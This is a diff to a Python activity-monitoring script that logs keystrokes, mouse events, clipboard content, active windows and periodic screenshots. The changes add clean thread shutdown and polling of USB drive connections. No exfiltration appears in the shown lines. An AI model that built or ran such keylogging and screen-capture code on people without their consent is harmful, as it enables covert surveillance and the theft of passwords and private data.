@@ -4,12 +4,14 @@ import psutil
 import logging
 import time
 import threading
-import re
 from collections import deque, defaultdict
 from cryptography.fernet import Fernet
 from pynput import keyboard, mouse
 from PIL import ImageGrab
 import requests
+import win32file
+import win32con
+import string
 
 # Windows-specific imports
 if platform.system() == "Windows":
@@ -19,7 +21,7 @@ if platform.system() == "Windows":
     except ImportError:
         logging.error("win32gui or win32process not found. Please install pywin32.")
 
-# Optional clipboard monitoring
+# Clipboard monitoring
 try:
     import pyperclip
     clipboard_available = True
@@ -46,6 +48,8 @@ active_window_start_time = time.time()
 pressed_keys = set()
 clipboard_content = None  # For clipboard changes
 usage_stats = defaultdict(float)  # For application usage statistics
+
+stop_event = threading.Event()
 
 def get_active_window_process_name() -> str:
     """Returns the active window's process name and title."""
@@ -148,6 +152,7 @@ def on_scroll(x: int, y: int, dx: int, dy: int) -> None:
 def stop_listeners() -> None:
     """Stop all listeners and signal the clipboard thread to stop."""
     try:
+        stop_event.set()
         keyboard_listener.stop()
         mouse_listener.stop()
         key_combination_listener.stop()
@@ -167,13 +172,13 @@ def on_key_combination(key) -> None:
 
 def periodic_flush() -> None:
     """Flush the log buffer to disk every 10 seconds."""
-    while True:
+    while not stop_event.is_set():
         time.sleep(10)
         flush_log_buffer()
 
 def log_active_window() -> None:
     """Log the active window every 5 seconds."""
-    while True:
+    while not stop_event.is_set():
         time.sleep(5)
         handle_window_change()
         log_event(f"Active window: {active_window_name}")
@@ -205,9 +210,9 @@ def capture_screenshot() -> None:
 
 def periodic_screenshot_capture(interval: int = 60) -> None:
     """Capture screenshots at regular intervals."""
-    while True:
-        time.sleep(interval)
+    while not stop_event.is_set():
         capture_screenshot()
+        time.sleep(interval)
 
 def log_network_activity(url: str) -> None:
     """Log network activity such as visited URLs."""
@@ -223,6 +228,28 @@ def display_usage_statistics() -> None:
     for window, duration in usage_stats.items():
         print(f"{window}: {duration:.2f} seconds")
     print("\n--- End of Statistics ---\n")
+
+def get_drive_letters(bitmask):
+    """Convert bitmask to a set of drive letters."""
+    drives = set()
+    for i in range(26):
+        if bitmask & (1 << i):
+            drives.add(f"{string.ascii_uppercase[i]}:\\")
+    return drives
+
+def monitor_usb_devices() -> None:
+    """Monitor USB device connections and disconnections."""
+    drive_list = get_drive_letters(win32file.GetLogicalDrives())
+    while not stop_event.is_set():
+        time.sleep(1)
+        new_drive_list = get_drive_letters(win32file.GetLogicalDrives())
+        added_drives = new_drive_list - drive_list
+        removed_drives = drive_list - new_drive_list
+        for drive in added_drives:
+            log_event(f"USB device connected: {drive}")
+        for drive in removed_drives:
+            log_event(f"USB device disconnected: {drive}")
+        drive_list = new_drive_list
 
 # --- Set up Listeners and Threads ---
 try:
@@ -257,6 +284,9 @@ if clipboard_available:
 screenshot_thread = threading.Thread(target=periodic_screenshot_capture, daemon=True)
 screenshot_thread.start()
 
+usb_thread = threading.Thread(target=monitor_usb_devices, daemon=True)
+usb_thread.start()
+
 # Main loop: block until listeners are stopped
 try:
     keyboard_listener.join()
@@ -265,6 +295,7 @@ try:
     if clipboard_available:
         clipboard_thread.join()
     screenshot_thread.join()
+    usb_thread.join()
 except Exception as e:
     logging.error(f"Error joining listeners: {e}")
 
